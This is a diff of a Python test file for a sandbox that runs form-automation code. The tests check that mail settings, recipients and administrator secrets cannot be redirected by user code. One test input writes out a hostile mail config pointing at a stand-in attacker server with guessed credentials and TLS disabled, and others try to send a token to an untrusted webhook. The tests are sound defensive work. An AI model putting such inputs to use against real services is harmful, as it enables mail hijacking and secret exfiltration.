@@ -46,11 +46,20 @@ def toolbox(fakes=None, **overrides):
         "Sender": "forms@acme.example",
     }
     secrets = {"Token": SECRET, "Password": "smtp-pw", "Credentials": '{"token": "t"}'}
+
+    async def deliver(config, subject, recipients, creator_mail):
+        fakes.calls.append(("deliver", (config, subject, recipients, creator_mail), {}))
+        return "ok"
+
+    def prepare(respondent):
+        fakes.calls.append(("prepare", (respondent,), {}))
+        return ("config", respondent)
+
     box = Toolbox(
         parameters=parameters,
         secrets=secrets,
-        trusted_hosts=[],
-        smtp_trusted=False,
+        trusted_origins=[],
+        instance_secrets=set(),
         respondent_email="responder@example.org",
         webhook=fakes.recorder(
             "webhook", type("R", (), {"status_code": 200, "text": "fine"})()
@@ -61,14 +70,15 @@ def toolbox(fakes=None, **overrides):
         slack=fakes.recorder(
             "slack", type("R", (), {"status_code": 200, "text": "ok"})()
         ),
-        config_mail=lambda *args: ("config", args),
-        send_mail=fakes.recorder("send_mail", "ok"),
+        prepare_mail=prepare,
+        deliver_mail=deliver,
         append_sheet=fakes.recorder("sheet", "Appended"),
         approved_recipient=lambda address: (
             address.casefold()
             if address == "owner@acme.example"
             else (_ for _ in ()).throw(PermissionError())
         ),
+        mark_broken=fakes.recorder("mark_broken"),
     )
     for key, value in overrides.items():
         setattr(box, key, value)
@@ -205,59 +215,82 @@ def test_resolve_secrets():
         resolve_secrets({"$secret": 5}, {"A": "v"})
 
 
-MAIL = (
-    "c = config_mail(get_parameter('Username'), get_secret('Password'), "
-    "get_parameter('Sender'), get_parameter('Port'), get_parameter('server'))\n"
-)
+def delivered(box):
+    return [call for call in box.fakes.calls if call[0] == "deliver"]
 
 
-def test_a_mail_uses_the_configured_login_and_goes_to_the_respondent_or_a_member():
+def test_a_mail_is_built_by_the_executor_from_the_actions_own_settings():
     box = toolbox()
     outcome = run(
-        MAIL
-        + "send_mail_action(c, 'Thanks', ['responder@example.org', 'owner@acme.example'])",
+        "send_mail_action(None, 'Thanks', ['responder@example.org', 'owner@acme.example'])",
         box,
     )
     assert outcome.error is None, outcome.error
-    name, args, _ = box.fakes.calls[0]
-    assert name == "send_mail"
-    assert args[1] == "Thanks"
-    assert args[2] == ["responder@example.org", "owner@acme.example"]
-    assert args[0][0] == "config"
-    assert args[0][1][1] == "smtp-pw"  # the password opened here
-    assert "smtp-pw" not in repr(outcome)
+    kinds = [(c[0], c[1]) for c in box.fakes.calls]
+    # the respondent's copy (prepared as such), then the team's: each its own kind
+    assert kinds == [
+        ("prepare", (True,)),
+        ("deliver", (("config", True), "Thanks", ["responder@example.org"], False)),
+        ("prepare", (False,)),
+        ("deliver", (("config", False), "Thanks", ["owner@acme.example"], True)),
+    ]
+
+
+def test_nothing_of_the_mail_settings_comes_from_the_code():
+    # a config naming another server, login, TLS settings or kind of copy is
+    # not even sent: the broker never sees it
+    box = toolbox()
+    outcome = run(
+        "c = config_mail('root', 'guess', 'evil@attacker.example', 25, 'attacker.example', "
+        "tls=False, ssl=False, use_credentials=False, validate_certs=False)\n"
+        "send_mail_action(c, 'x', ['owner@acme.example'], creator_mail=False)",
+        box,
+    )
+    assert outcome.error is None, outcome.error
+    (call,) = delivered(box)
+    config, subject, recipients, creator_mail = call[1]
+    assert config == ("config", False)  # built by prepare_mail from the action's group
+    assert creator_mail is True  # the recipient is a member: the team's copy
+    assert "attacker" not in repr(box.fakes.calls) and "guess" not in repr(
+        box.fakes.calls
+    )
+
+
+def test_the_respondents_address_is_the_one_the_executor_holds():
+    box = toolbox(respondent_email="Responder@Example.org")
+    outcome = run("send_mail_action(None, 'x', ['  responder@example.ORG '])", box)
+    assert outcome.error is None, outcome.error
+    assert delivered(box)[0][1][2] == ["Responder@Example.org"]
 
 
 @pytest.mark.parametrize(
-    "tail",
+    "call",
     [
-        "send_mail_action(c, 'x', ['stranger@elsewhere.example'])",  # not a member
-        "send_mail_action(c, 'x', ['owner@acme.example'] * 6)",  # too many
-        "send_mail_action(c, 'x', [])",
-        "send_mail_action(c, 'x' * 1000, ['owner@acme.example'])",
-        "send_mail_action(dict(c, smtp_server='attacker.example'), 'x', ['owner@acme.example'])",
-        "send_mail_action(dict(c, smtp_username='root'), 'x', ['owner@acme.example'])",
-        "send_mail_action(dict(c, smtp_password='guess'), 'x', ['owner@acme.example'])",
-        "send_mail_action(dict(c, extra=1), 'x', ['owner@acme.example'])",
-        "send_mail_action('not a config', 'x', ['owner@acme.example'])",
+        "send_mail_action(None, 'x', ['stranger@elsewhere.example'])",  # not a member
+        "send_mail_action(None, 'x', ['owner@acme.example'] * 3 + ['responder@example.org', 'a', 'b', 'c'])",
+        "send_mail_action(None, 'x', [])",
+        "send_mail_action(None, 'x' * 1000, ['owner@acme.example'])",
+        "send_mail_action(None, '', ['owner@acme.example'])",
+        "send_mail_action(None, 'x', 'owner@acme.example, stranger@elsewhere.example')",
+        "send_mail_action(None, 'x', [1])",
     ],
 )
-def test_a_mail_that_is_not_the_configured_one_is_refused(tail):
+def test_a_mail_to_anyone_but_the_respondent_or_a_member_is_refused(call):
     box = toolbox()
-    outcome = run(MAIL + tail, box)
+    outcome = run(call, box)
     assert outcome.error["kind"] == "http", outcome
-    assert box.fakes.calls == []
+    assert delivered(box) == []
 
 
 def test_a_mail_server_a_workspace_named_must_be_public(monkeypatch):
-    monkeypatch.setattr(egress, "resolve", lambda host, port: ["10.0.0.5"])
-    box = toolbox()
-    outcome = run(MAIL + "send_mail_action(c, 'x', ['owner@acme.example'])", box)
-    assert outcome.error["kind"] == "http" and "not_allowed" in outcome.error["message"]
-    # the instance's own server is its administrators' choice
-    box = toolbox(smtp_trusted=True)
-    outcome = run(MAIL + "send_mail_action(c, 'x', ['owner@acme.example'])", box)
-    assert outcome.error is None
+    # prepare_mail judges the destination (blocking); a refusal reaches the code
+    def prepare(respondent):
+        raise egress.EgressRefused("not_allowed")
+
+    box = toolbox(prepare_mail=prepare)
+    outcome = run("send_mail_action(None, 'x', ['owner@acme.example'])", box)
+    assert outcome.error["kind"] == "http"
+    assert delivered(box) == []
 
 
 def test_a_sheet_row_goes_to_a_configured_sheet_with_the_runs_own_credential():
@@ -351,3 +384,45 @@ def test_a_call_with_the_wrong_arguments_is_refused_not_crashed():
     assert (
         outcome.error["kind"] == "http" and outcome.error["message"] == "bad arguments"
     )
+
+
+def test_an_instance_secret_goes_only_to_an_origin_the_administrators_set():
+    code = (
+        "send_data_webhook(get_parameter('Webhook URL'), "
+        "headers={'Authorization': get_secret('Token')})"
+    )
+    # the address is a creator's (a parameter of the workspace or the form): no
+    box = toolbox(instance_secrets={"Token"})
+    outcome = run(code, box)
+    assert outcome.error["kind"] == "http"
+    assert "administrators" in outcome.error["message"]
+    assert box.fakes.calls == []
+    # the same address set by the administrators (origin: scheme, host, port): yes
+    box = toolbox(
+        instance_secrets={"Token"},
+        trusted_origins=[("https", "hooks.acme.example", 443)],
+    )
+    assert run(code, box).error is None
+    assert box.fakes.calls[0][1][3] == {"Authorization": SECRET}
+    # the host alone is not the origin
+    box = toolbox(
+        instance_secrets={"Token"},
+        trusted_origins=[
+            ("http", "hooks.acme.example", 80),
+            ("https", "hooks.acme.example", 8443),
+        ],
+    )
+    assert run(code, box).error["kind"] == "http"
+    assert box.fakes.calls == []
+    # a secret the workspace or the form stored is theirs to send to their address
+    box = toolbox(instance_secrets=set())
+    assert run(code, box).error is None
+
+
+def test_an_instance_secret_in_a_body_is_held_to_the_same_rule():
+    box = toolbox(instance_secrets={"Token"})
+    outcome = run(
+        "send_data_webhook(get_parameter('Webhook URL'), data={'k': [get_secret('Token')]})",
+        box,
+    )
+    assert outcome.error["kind"] == "http" and box.fakes.calls == []
